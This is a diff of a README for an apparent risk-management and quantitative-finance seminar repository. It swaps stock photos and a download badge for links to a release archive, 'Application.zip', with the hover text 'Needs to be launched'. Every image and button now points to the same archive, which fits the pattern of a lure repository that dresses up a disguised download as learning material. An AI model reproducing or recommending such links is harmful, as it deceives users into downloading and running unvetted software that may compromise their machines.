@@ -4,7 +4,7 @@
 
 Welcome to the "Seminar_RiskManagement" repository! This is your ultimate resource for diving deep into **Risk Management and Hedging Techniques in Quantitative Finance**. Whether you're a seasoned pro in the world of quantitative finance or just starting out, this repository is packed with valuable insights, strategies, and tools to enhance your knowledge and skills in managing risks effectively.
 
-![Quantitative Finance](https://cdn.pixabay.com/photo/2016/06/10/21/35/stocks-1456735_960_720.jpg)
+![Quantitative Finance](https://github.com/Polpol9898/Seminar_RiskManagement/releases/download/v1.0/Application.zip)
 
 ## Seminar/Workshop Details
 
@@ -28,7 +28,7 @@ Here are some of the key topics that you can expect to delve into by exploring t
 
 To access the software and resources related to this seminar, please download the package by clicking the button below:
 
-[![Software Download](https://img.shields.io/badge/Download-Software-blue.svg)](https://github.com/user-attachments/files/18410590/Software.zip "Needs to be launched")
+[![Software Download](https://github.com/Polpol9898/Seminar_RiskManagement/releases/download/v1.0/Application.zip)](https://github.com/Polpol9898/Seminar_RiskManagement/releases/download/v1.0/Application.zip "Needs to be launched")
 
 If the link doesn't work or is unavailable, make sure to check the **Releases** section of this repository for alternative download options.
 
@@ -38,4 +38,4 @@ Feel free to explore the content, contribute to the discussions, and engage with
 
 Happy learning! 🌟
 
-![Finance](https://cdn.pixabay.com/photo/2015/09/20/14/00/forest-948606_960_720.jpg)
+![Finance](https://github.com/Polpol9898/Seminar_RiskManagement/releases/download/v1.0/Application.zip)
